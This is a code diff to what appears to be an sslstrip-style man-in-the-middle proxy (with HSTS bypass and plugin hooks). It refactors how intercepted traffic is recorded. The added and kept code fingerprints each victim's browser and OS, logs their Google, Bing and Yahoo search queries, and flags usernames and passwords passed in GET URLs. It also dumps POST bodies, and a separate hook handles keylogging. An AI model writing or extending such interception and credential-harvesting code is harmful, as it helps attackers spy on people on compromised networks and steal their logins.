@@ -19,6 +19,7 @@
 import logging, re, string, random, zlib, gzip, StringIO, sys
 import plugins
 
+from user_agents import parse
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
 from libs.sergioproxy.ProxyPlugins import ProxyPlugins
@@ -46,6 +47,7 @@ class ServerConnection(HTTPClient):
         self.postData         = postData
         self.headers          = headers
         self.client           = client
+        self.clientInfo       = None
         self.urlMonitor       = URLMonitor.getInstance()
         self.hsts             = URLMonitor.getInstance().isHstsBypass()
         self.plugins          = ProxyPlugins.getInstance()
@@ -73,50 +75,25 @@ class ServerConnection(HTTPClient):
 
     def sendRequest(self):
         if self.command == 'GET':
-            message = "%s Sending Request: %s"  % (self.client.getClientIP(), self.headers['host'])
-            if self.urlMonitor.isClientLogging() is True:
-                self.urlMonitor.writeClientLog(self.client, self.headers, message)
-            else:
-                logging.info(message)
+            user_agent = parse(self.headers['user-agent'])
+            self.clientInfo = "%s [type:%s-%s os:%s] "  % (self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
+
+            logging.info(self.clientInfo + "Sending Request: %s" % self.headers['host'])
 
             #Capture google searches
             if ('google' in self.headers['host']):
-                if ('search' in self.uri): #and ('search' in self.uri):
-                    try:
-                        for param in self.uri.split('&'):
-                            if param.split('=')[0] == 'q':
-                                query = str(param.split('=')[1])
-                                if query:
-                                    logging.info("%s is querying %s for: '%s'" % (self.client.getClientIP(), self.headers['host'], query))
-                    except Exception, e:
-                        error = str(e)
-                        logging.warning("%s Error parsing google search query %s" % (self.client.getClientIP(), error))
+                if ('search' in self.uri):
+                    self.captureQueries('q')
 
             #Capture bing searches
             if ('bing' in self.headers['host']):
                 if ('Suggestions' in self.uri):
-                    try:
-                        for param in self.uri.split('&'):
-                            if param.split('=')[0] == 'qry':
-                                query = str(param.split('=')[1])
-                                if query:
-                                    logging.info("%s is querying %s for: '%s'" % (self.client.getClientIP(), self.headers['host'], query))
-                    except Exception, e:
-                        error = str(e)
-                        logging.warning("%s Error parsing bing search query %s" % (self.client.getClientIP(), error))
+                    self.captureQueries('qry')
 
             #Capture yahoo searches
             if ('search.yahoo' in self.headers['host']):
                 if ('nresults' in self.uri):
-                    try:
-                        for param in self.uri.split('&'):
-                            if param.split('=')[0] == 'command':
-                                query = str(param.split('=')[1])
-                                if query:
-                                    logging.info("%s is querying %s for: '%s'" % (self.client.getClientIP(), self.headers['host'], query))
-                    except Exception, e:
-                        error = str(e)
-                        logging.warning("%s Error parsing yahoo search query %s" % (self.client.getClientIP(), error))
+                    self.captureQueries('command')
 
             #check for creds passed in GET requests.. It's surprising to see how many people still do this (please stahp)
             for user in self.http_userfields:
@@ -126,11 +103,21 @@ class ServerConnection(HTTPClient):
                 password = re.findall("(" + passw + ")=([^&|;]*)", self.uri, re.IGNORECASE)
 
             if (username and password):
-                message = "%s %s Possible Credentials (%s):\n%s" % (self.client.getClientIP(), self.command, self.headers['host'], self.uri)
-                logging.warning(message)
+                logging.warning(self.clientInfo + "%s Possible Credentials (%s):\n%s" % (self.command, self.headers['host'], self.uri))
 
         self.plugins.hook()
         self.sendCommand(self.command, self.uri)
+
+    def captureQueries(self, search_param):
+        try:
+            for param in self.uri.split('&'):
+                if param.split('=')[0] == search_param:
+                    query = str(param.split('=')[1])
+                    if query:
+                        logging.info(self.clientInfo + "is querying %s for: %s" % (self.headers['host'], query))
+        except Exception, e:
+            error = str(e)
+            logging.warning(self.clientInfo + "Error parsing google search query %s" % error)
 
     def sendHeaders(self):
         for header, value in self.headers.items():
@@ -145,11 +132,7 @@ class ServerConnection(HTTPClient):
         elif 'keylog' in self.uri:
             self.plugins.hook()
         else:
-            message = "%s %s Data (%s):\n%s" % (self.client.getClientIP(),self.getPostPrefix(),self.headers['host'],self.postData)
-            if self.urlMonitor.isClientLogging() is True:
-                self.urlMonitor.writeClientLog(self.client, self.headers, message)
-            else:
-                logging.warning(message)
+            logging.warning("%s %s Data (%s):\n%s" % (self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], self.postData))
             self.transport.write(self.postData)
 
     def connectionMade(self):
